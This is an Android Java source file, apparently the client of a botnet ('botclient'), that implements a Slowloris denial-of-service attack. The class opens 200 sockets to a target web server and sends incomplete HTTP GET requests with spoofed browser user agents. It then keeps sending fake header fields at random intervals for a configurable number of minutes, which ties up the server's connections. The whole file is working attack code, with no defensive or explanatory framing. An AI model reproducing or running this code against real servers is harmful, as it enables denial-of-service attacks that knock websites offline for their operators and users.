package com.example.botclient.slowloris;

import android.util.Log;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Random;

public class SlowLoris extends android.os.AsyncTask<Void, String, Exception>
{
    int a;
    private static final int numberOfConnections = 200; //the number of socket connections to the web server per thread
    private int serverPort; //the server port to connect to
    private int attackMinutes; //number of seconds to stop the attack after, 0 = never stop
    private URL url; //the url of the server

    private BufferedReader in[]=new BufferedReader[numberOfConnections];;
    private BufferedWriter out[]= new BufferedWriter[numberOfConnections];
    private Socket socket[] = new Socket[numberOfConnections];;
    private boolean interrupted = false;
    private String[] allPartialRequests = new String[numberOfConnections];
    private String TAG = getClass().getName();

    public SlowLoris() {} //default constructor

    public SlowLoris(String Surl, int port, int timeout) throws MalformedURLException //constructor
    {
        String targetPrefix = Surl.startsWith("http://") ? "" : "http://";
        url = new URL(targetPrefix + Surl);
        this.serverPort = port;
        this.attackMinutes = timeout;
        allPartialRequests = createInitialPartialRequests();
    }
    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        System.runFinalization();
        Runtime.getRuntime().gc();
        System.gc();
    }


    @Override
    protected void onPostExecute(Exception result)
    {
        super.onPostExecute(result);
        Log.d("OnPostExecute", "Finished communication with the socket. Result = " + result);
//        disconnect();
    }

    @Override
    protected void onProgressUpdate(String... values) {
        super.onProgressUpdate(values);
    }

    private String[] createInitialPartialRequests() // the partial requests sent for each connection
    {
        String pagePrefix = "/";
        if(url.getPath().startsWith("/"))
        {
            pagePrefix = "";
        }

        String type = "GET " + pagePrefix + url.getPath() + " HTTP/1.1\r\n";
        String host = "Host: " + url.getHost() + (serverPort == 80 ? "" : ":" + serverPort) + "\r\n";
        String contentType = "Content-Type: */* \r\n";
        String connection = "Connection: keep-alive\r\n";

        String[] agents = {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" ,
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" ,
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0" ,
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"};

        String[] allPartials = new String[numberOfConnections];

        for(int i = 0; i < numberOfConnections; i++)
        {
            allPartials[i] = type + host + contentType + connection + agents[new Random().nextInt(agents.length)] + "\r\n";
        }
        return allPartials;
    }


    private void attack()
    {
        for(int i = 0; i < numberOfConnections; i++)
        {
            sendFalseHeaderField(i);
            try
            {
                Thread.sleep(new Random().nextInt(3407)); // wait a random time before sending
            }
            catch(InterruptedException ie)
            {
                ie.printStackTrace();
            }
        }
    }

    private void sendFalseHeaderField(int index)
    {
        char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
        String fakeField = alphabet[new Random().nextInt(alphabet.length)] + "-" + alphabet[new Random().nextInt(alphabet.length)] + ": " + new Random().nextInt() + "\r\n";
        try
        {
            socket[index].getOutputStream().write(fakeField.getBytes());
        }
        catch(Exception ioe)
        {
            ioe.printStackTrace();
            initConnection(index); // try to re-connect
        }
    }

    private void sendPartialRequest(int index) //sends the partial request to the web server
    {
        try
        {
            System.out.println(allPartialRequests[new Random().nextInt(numberOfConnections)]);
            socket[index].getOutputStream().write(allPartialRequests[new Random().nextInt(numberOfConnections)].getBytes()); // write a random partial HTTP GET request to the server
        }
        catch(Exception ioe)
        {
            ioe.printStackTrace();
            initConnection(index); // try to reestablish connection
        }
    }

    //static int po=0;

    @Override
    protected Exception doInBackground(Void... voids)
    {
        Exception error = null;

        try
        {
            long startTime = System.currentTimeMillis();

            for(int i = 0; i < numberOfConnections; i++) // each connection sends a partial request
            {
                Log.d(TAG, "Opening socket connection.");
                socket[i] = new Socket(InetAddress.getByName(url.toExternalForm().replace("http://", "")), serverPort);
                //po++;

                if(socket[i].isConnected())
                {
                    System.out.println("Connector: " + toString() + "    Sending partial request: " + i);
                    sendPartialRequest(i);

                    try
                    {
                        Thread.sleep(new Random().nextInt(2138)); //sleeps for some time until the new partial request is sent
                    }
                    catch(Exception ie)
                    {
                        ie.printStackTrace();
                    }
                }
            }

            // main attack loop
            while((System.currentTimeMillis() - startTime) < (attackMinutes * 60 * 1000))
                attack();

        } catch (UnknownHostException ex) {
            Log.e(TAG, "doInBackground(): " + ex.toString());
            error = interrupted ? null : ex;
        } catch (IOException ex) {
            Log.d(TAG, "doInBackground(): " + ex.toString());
            error = interrupted ? null : ex;
        } catch (Exception ex) {
            Log.e(TAG, "doInBackground(): " + ex.toString());
            error = interrupted ? null : ex;
        } finally {

            disconnect();
        }

        return error;
    }

    private void initConnection(int index) //creates and initialiazes the sockets
    {
        a = index;
        Runnable socketTask = new Runnable()
        {
            @Override
            public void run()
            {
            try
            {
                System.out.println("Connector: " + toString() + "     Connecting: " + a);
                socket[a] = new Socket(InetAddress.getByName(url.toExternalForm().replace("http://", "")), serverPort);
            }
            catch(Exception ioe)
            {   ioe.printStackTrace();
                System.exit(-1);
            }
            }
        };
        Thread serverThread = new Thread(socketTask);
        serverThread.start();
    }


    public void disconnect() //closes all the sockets
    {
        try {
            Log.d(TAG, "Closing the socket connection.");

            interrupted = true;

            for(int i = 0; i < numberOfConnections; i++)
            {
                if(socket[i] != null)
                {
                    socket[i].getOutputStream().write("\r\n".getBytes());
                    socket[i].close();
                }
            }

        } catch (IOException ex) {
            Log.e(TAG, "disconnect(): " + ex.toString());
        }
    }
}
